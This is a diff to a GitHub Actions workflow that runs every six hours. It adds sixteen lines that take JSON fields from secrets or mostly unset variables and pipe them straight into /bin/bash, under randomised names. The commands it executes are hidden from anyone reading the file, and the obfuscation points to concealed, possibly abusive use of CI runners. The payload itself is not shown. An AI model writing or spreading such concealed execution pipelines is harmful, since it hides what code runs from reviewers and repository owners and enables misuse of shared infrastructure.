@@ -2,23 +2,31 @@ name: panxiaoyi1988
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 1/6 * * *'
+    - cron: '17 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: panxiaoyi1988
         env:
-          g07: ${{ secrets.g07 }}
+          s441: ${{ secrets.s441 }}
         run: |
-          echo $g07 | jq -r .uobjq8206 | /bin/bash
-          echo $gkv73 | jq -r .rjq61466 | /bin/bash
-          echo $u7666 | jq -r .bxrrs480 | /bin/bash
-          echo $tbxnr7 | jq -r .h6 | /bin/bash
-          echo $rdcx3487 | jq -r .ndwsb3984 | /bin/bash
-          echo $i73611 | jq -r .m1 | /bin/bash
-          echo $norjm2785 | jq -r .hv5814 | /bin/bash
-          echo $q09 | jq -r .ce87 | /bin/bash
-          echo $tt0171 | jq -r .kbo853 | /bin/bash
+          echo $s441 | jq -r .kfr9 | /bin/bash
+          echo $axdhh67 | jq -r .adrq0 | /bin/bash
+          echo $uvgl785 | jq -r .hdxdd45 | /bin/bash
+          echo $xtbb357 | jq -r .dykbn03889 | /bin/bash
+          echo $t803 | jq -r .eaeq081 | /bin/bash
+          echo $x4901 | jq -r .nyeh27 | /bin/bash
+          echo $uj509 | jq -r .tdfm051 | /bin/bash
+          echo $ofi34 | jq -r .l7 | /bin/bash
+          echo $fwoo72837 | jq -r .ifree23 | /bin/bash
+          echo $f67 | jq -r .v0928 | /bin/bash
+          echo $vte85292 | jq -r .d51536 | /bin/bash
+          echo $hsci1348 | jq -r .ipl46 | /bin/bash
+          echo $yth23138 | jq -r .unra414 | /bin/bash
+          echo $ru5 | jq -r .mlbvu79 | /bin/bash
+          echo $iwxx020 | jq -r .ifyvu960 | /bin/bash
+          echo $vbwj63 | jq -r .uoq4747 | /bin/bash
 
